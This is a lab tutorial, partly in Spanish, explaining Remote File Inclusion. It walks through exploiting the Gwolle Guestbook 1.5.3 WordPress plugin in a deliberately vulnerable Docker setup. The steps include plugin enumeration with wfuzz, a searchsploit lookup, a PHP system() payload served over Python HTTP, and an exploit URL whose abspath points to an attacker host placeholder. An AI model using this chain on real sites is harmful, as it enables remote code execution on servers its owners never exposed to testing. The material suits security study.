The Remote File Inclusion (RFI) vulnerability is a security vulnerability where an attacker can include remote files in a vulnerable web application. This can allow the attacker to execute malicious code on the web server and compromise the system.

En un ataque de RFI, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para incluir un archivo remoto en la solicitud. Si la aplicación web no valida adecuadamente estas entradas, procesará la solicitud y devolverá el contenido del archivo remoto al atacante.

Un atacante puede utilizar esta vulnerabilidad para incluir archivos remotos maliciosos que contienen código malicioso, como virus o troyanos, o para ejecutar comandos en el servidor vulnerable. En algunos casos, el atacante puede dirigir la solicitud hacia un recurso PHP alojado en un servidor de su propiedad, lo que le brinda un mayor grado de control en el ataque.

# Example

----
> The source to test the example below can be found here: [dvwp](https://github.com/vavkamil/dvwp).
> The [[WordPress]] plugin can be found here: [Gwolle Guestbook](https://es.wordpress.org/plugins/gwolle-gb/).
----

First of all, we are going to download and configure the *WordPress* example into [[Docker]]. We can check that the port occupied by *WordPress* is 31337, so go there and finish the setup.

Once configured, let's download *Gwolle* version 1.5.3. To do this we go to the download web page and replace the current version with the desired one. 

If we try to add the plugin to *WordPress* it will give us a write permission error on the wp-content folder. To fix this we need to go into the *Docker* container and change the owner of the folder to www-data:

```bash
docker exec -it dvwp_wordpress_1 bash

# We give permissions to the wp-content folder recursively
chown www-data:www-data -R wp-content/
```

This time if we try to activate the plugin it will not give us any error.

To be able to see as an attacker the plugins that are installed in *WordPress*, we can use the wfuzz tool with a [SecLists](https://github.com/danielmiessler/SecLists) dictionary:

```bash
# In this case we will use the colorized mode (-c) hiding 404 status codes and using 200 threads to launch 200 tasks using a dictionary
wfuzz -c --hc=404 -t200 -w SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://localhost:31337/FUZZ
```

We have seen that there is indeed a plugin called *Gwolle*, so we can search for its version and see if there is any vulnerability in *searchsploit*:

```bash
searchsploit gwolle
```

We can see that there is indeed a vulnerability for this version of *Gwolle* that allows *Remote File Inclusion*. Let's open the source code of the vulnerability to see how to exploit it:

```bash
searchsploit -x php/webapps/38861.txt
```

We see that the way to execute this script is by referring to the GET *abspath* parameter, so if we create a local file *wp-load.php* and load it remotely from the abspath parameter sharing it with Python, we could execute commands remotely.

```
http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
```

We also see that in order to exploit this vulnerability, *allow_url_include* must be enabled, so we must enable it in the php.ini of our container :

```ini
allow_url_include = "on"
```

Finally we must restart the Docker container to apply the changes:

```bash
docker restart dvwp_wordpress_1
```

In principle we should already have everything ready to exploit the vulnerability, so we are going to create the file *wp-load.php* and share it with an HTTP server in Python. The PHP file can include for example the following:

```php
<?php
	system("whoami");
?>
```

Podemos ejecutar el PHP creado anteriormente de la siguiente manera:

```
python3 -m http.server 80

http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://{ATTACKER_IP}/
```

If everything went well we should be able to see the output in the browser.